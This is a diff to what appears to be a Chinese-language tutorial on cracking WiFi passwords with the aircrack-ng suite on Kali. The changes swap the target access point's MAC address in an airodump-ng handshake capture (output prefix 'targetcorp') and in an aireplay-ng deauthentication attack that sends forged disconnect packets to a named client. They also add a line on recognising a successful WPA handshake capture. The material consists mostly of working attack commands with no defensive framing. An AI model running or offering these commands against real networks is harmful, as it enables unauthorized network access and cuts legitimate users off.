@@ -150,6 +150,8 @@ airodump-ng wlan0 (网卡名称)扫描附近WIFI
 mkdir /home/kali/桌面/
 airodump-ng -c 11 --bssid B0:D5:9D:42:FA:A3 -w 文件路径 wlan0mon
 
+抓取右上角显示WPAhandshake就是成功了
+
 11是你选用的CH，CH是几，你就用几
 -c指定信道，一定要是上一步查到的要破解的wifi所用信道
 -bssid指定bssid值，一定要是上一步查到的要破解的wifi的bssid
@@ -756,7 +758,7 @@ cd ~/captures
 # 启动精准捕获
 sudo airodump-ng \
   --channel 11 \                        # 锁定信道（关键！）
-  --bssid B0:D5:9D:42:FA:A3 \         # 目标AP的MAC
+  --bssid D8:32:14:63:65:F4 \         # 目标AP的MAC
   --write handshakes/targetcorp \       # 输出前缀
   --write-interval 10 \                 # 每10秒写盘一次
   wlan0mon
@@ -786,7 +788,7 @@ sudo airodump-ng \
 # Deauth攻击（发送伪造断开包）
 sudo aireplay-ng \
   --deauth 10 \                         # 发送10个断开包
-  --source B0:D5:9D:42:FA:A3 \        # AP MAC（-a参数）
+  --source D8:32:14:63:65:F4 \        # AP MAC（-a参数）
   --destination C4:F0:81:02:87:5E \   # 客户端MAC（-c参数）
   wlan0mon
 
